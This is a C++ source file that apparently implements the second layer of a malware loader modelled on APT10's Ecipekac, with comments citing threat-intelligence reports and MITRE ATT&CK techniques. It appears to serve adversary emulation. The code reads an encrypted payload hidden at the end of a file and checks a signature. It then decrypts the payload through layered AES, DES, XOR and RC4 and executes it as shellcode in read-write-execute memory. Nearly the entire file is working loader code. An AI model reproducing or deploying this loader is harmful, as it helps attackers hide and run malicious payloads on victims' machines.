#include "layer2_loader.h"



std::vector<unsigned char>(*encryption_order[])(std::vector<unsigned char>) = DEFAULT_ENCRYPTION_ORDER;


// Path to the next file that holds the loader
// Note: This will be updated with SER-342
std::string filepath = DEFAULT_FILEPATH2;

/// <summary>
/// LoadData:
/// 
/// About:
///		Externally facing function that will be called to begin loading next dll
/// Result:
///		Layer 2 loader is loaded into memory and we call the next loader function
/// CTI:
///		https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:~:text=The%20attackers%20have%20also%20made%20slight%20modifications%20compared%20to%20the%20original%20implementation
/// </summary>
extern "C" __declspec (dllexport) int LoadData()
{
	if (debug) {
		std::string func_start = "LoadData - Layer2 - ";
		debug_message(func_start + "datasize: " + std::to_string(data_size), "[DEBUG]");
	}
	std::vector<unsigned char> encrypted_data = read_file(filepath);
	std::vector<unsigned char> decrypted_data;

	if (check_signature(encrypted_data, signature))
	{
		decrypted_data = decrypt(std::vector<unsigned char>(encrypted_data.begin() + 8, encrypted_data.end()));
		run_code(decrypted_data);
	}
	return 1;
}


/// <summary>
/// run_code:
/// 
/// About:
///		Allocates memory for the provided shellcode, copies the shellcode to memory and then runs it
/// Result:
///		Provided shellcode is run in memory. In this case using sRDI
/// MITRE ATT&CK Techniques:
///		T1620 Reflective Code Loading
/// </summary>
/// <param name="shellcode"></param>
void run_code(std::vector<unsigned char> shellcode) {
	if (debug) {
		debug_message("run_code - Layer2", "[DEBUG]");
	}
	void* exec = VirtualAlloc(0, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode.data(), shellcode.size());
	((void(*)())exec)();
}


/// <summary>
/// read_file:
/// 
/// About:
///		Reads the needed data from the end of a specified file. This data includes 
///		the encrypted binary and shellcode for the next loader
/// Result:
///		Shellcode and data is decrypted from the end of a file
/// CTI:
///		https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:~:text=The%20attackers%20have%20also%20made%20slight%20modifications%20compared%20to%20the%20original%20implementation
/// </summary>
std::vector<unsigned char> read_file(std::string filepath) {
	if (debug) {
		std::string func_start = "read_file - Layer2 - ";
		debug_message(func_start + "filepath: " + filepath, "[DEBUG]");
	}

	std::ifstream file(filepath, std::ios_base::in | std::ios_base::binary);

	// Tell stream not to skip tabs and newlines
	file.unsetf(std::ios::skipws);

	std::vector<unsigned char> file_data{ std::istream_iterator<unsigned char>(file), {} };



	std::vector<unsigned char> container_data(file_data.begin() + (file_data.size() - data_size),
		file_data.end());

	//Clear the data and capacity from larger vector
	std::vector<unsigned char>().swap(file_data);
	return container_data;


}

/// <summary>
/// AES:
/// 
/// About:
///		Calls the AES decryption from cryptopp
/// Result:
///		Provided data is decrypted using AES-CBC
/// CTI:
///		https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:~:text=The%20attackers%20have%20also%20made%20slight%20modifications%20compared%20to%20the%20original%20implementation
/// </summary>
std::vector<unsigned char> AES(std::vector<unsigned char> ciphertext) {
	if (debug) {
		debug_message("AES - layer2", "[DEBUG]");
	}

	try {
		// Verify provided key size
		if (sizeof(aes_key) != CryptoPP::AES::MAX_KEYLENGTH) {
			throw std::runtime_error("Invalid key size.");
		}


		// Buffer for plaintext
		std::vector<unsigned char> plaintext;
		plaintext.reserve(ciphertext.size());

		// Decrypt
		CryptoPP::CBC_Mode<CryptoPP::AES>::Decryption AES_decryptor(aes_key, sizeof(aes_key), aes_iv);
		CryptoPP::VectorSource vs(ciphertext, true,
			new CryptoPP::StreamTransformationFilter(AES_decryptor,
				new CryptoPP::VectorSink(plaintext), CryptoPP::BlockPaddingSchemeDef::BlockPaddingScheme::ZEROS_PADDING
			)
		);

		return plaintext;
	}
	catch (const CryptoPP::Exception& e) {
		std::cerr << e.what() << std::endl;
		exit(1);
	}
}

/// <summary>
/// DES:
/// 
/// About:
///		Calls the DES decryption from cryptopp
/// Result:
///		Provided data is decrypted using DES
/// CTI:
///		https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:~:text=The%20attackers%20have%20also%20made%20slight%20modifications%20compared%20to%20the%20original%20implementation
/// Reference:
///		https://cryptopp.com/wiki/TripleDES
/// </summary>
std::vector<unsigned char> DES(std::vector<unsigned char> ciphertext) {
	if (debug) {
		debug_message("DES - layer2", "[DEBUG]");
	}

	// Buffer for plaintext
	std::vector<unsigned char> plaintext;
	plaintext.reserve(ciphertext.size());


	try {
		CryptoPP::CBC_Mode< CryptoPP::DES_EDE2 >::Decryption DES_Decryptor;

		DES_Decryptor.SetKeyWithIV(des_key, des_key.size(), des_iv);
		CryptoPP::VectorSource vs(ciphertext, true,
			new CryptoPP::StreamTransformationFilter(DES_Decryptor,
				new CryptoPP::VectorSink(plaintext), CryptoPP::BlockPaddingSchemeDef::BlockPaddingScheme::ZEROS_PADDING
			)
		);

		return plaintext;

	}
	catch (const CryptoPP::Exception& e) {
		std::cerr << e.what() << std::endl;
		exit(1);
	}
}

/// <summary>
/// XOR:
/// 
/// About:
///		XOR's the data using a hardcoded key
/// Result:
///		Provided data is decrypted using XOR
/// CTI:
///		https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:~:text=The%20attackers%20have%20also%20made%20slight%20modifications%20compared%20to%20the%20original%20implementation
/// </summary>
std::vector<unsigned char> XOR(std::vector<unsigned char> ciphertext) {
	if (debug) {
		debug_message("XOR - layer2", "[DEBUG]");
	}

	std::vector<unsigned char> result(ciphertext.size());

	for (int i = 0; i < ciphertext.size(); i++) {
		result[i] = (ciphertext[i] ^ xor_key);
	}
	return result;
}

/// <summary>
/// RC4:
/// 
/// About:
///		RC4 decrypt the data using a hardcoded key
/// Result:
///		Provided data is decrypted using RC4
/// CTI:
///		https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:~:text=proceeding%20to%20decrypt%20a%20payload%20at%20offset%200x01C%20using%20RC4
/// Reference: 
///		https://www.cryptopp.com/wiki/ARC4
/// </summary>
std::vector<unsigned char> RC4(std::vector<unsigned char> ciphertext) {
	if (debug) {
		debug_message("RC4 - layer2", "[DEBUG]");
	}

	std::vector<unsigned char> result(ciphertext.size());

	try {
		CryptoPP::Weak::ARC4::Decryption dec;
		dec.SetKey(rc4_key, rc4_key.size());

		// Perform the decryption
		dec.ProcessData(&result[0], (const CryptoPP::byte*)&ciphertext[0], ciphertext.size());

		return result;
	}
	catch (const CryptoPP::Exception& e) {
		std::cerr << e.what() << std::endl;
		exit(1);
	}
}

/// <summary>
/// decrypt:
/// 
/// About:
///		Helper function that will call each of the needed decryption functions in 
///		the specified order
/// MITRE ATT&CK Techniques:
///          T1140 Deobfuscate/Decode Files or Information
/// Result:
///		Provided data is fullly decrypted
/// CTI:
///		https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:~:text=The%20attackers%20have%20also%20made%20slight%20modifications%20compared%20to%20the%20original%20implementation
/// </summary>
std::vector<unsigned char> decrypt(std::vector<unsigned char> data) {
	// The encryption order is set to the order encryption was added, so for decryption it must be reversed
	for (int i = (sizeof(encryption_order) / sizeof(encryption_order[0])) - 1; i >= 0; i--) {
		data = encryption_order[i](data);
	}

	// Check if we need to RC4 decrypt the data
	if (DEFAULT_RC4_USE) {
		data = RC4(data);
	}
	return data;
}


/// <summary>
/// check_signature:
/// 
/// About:
///		Helper function that will compare the first 8 bytes of the container with the 
///		provided signature to ensure we read from the correct file
/// Result:
///		true if the signature matches, false if not
/// CTI:
///		https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/#:~:text=a%20unique%20string%20found%20in%20the%20second%20layer%20of%20the%20Ecipekac%20loader
/// </summary>
bool check_signature(std::vector<unsigned char> data, std::vector<unsigned char> signature) {
	if (debug) {
		debug_message("LoadData - check_signature", "[DEBUG]");
	}

	for (int i = 0; i < signature.size(); i++) {
		if (data[i] != signature[i])
			return false;
	}
	return true;
}

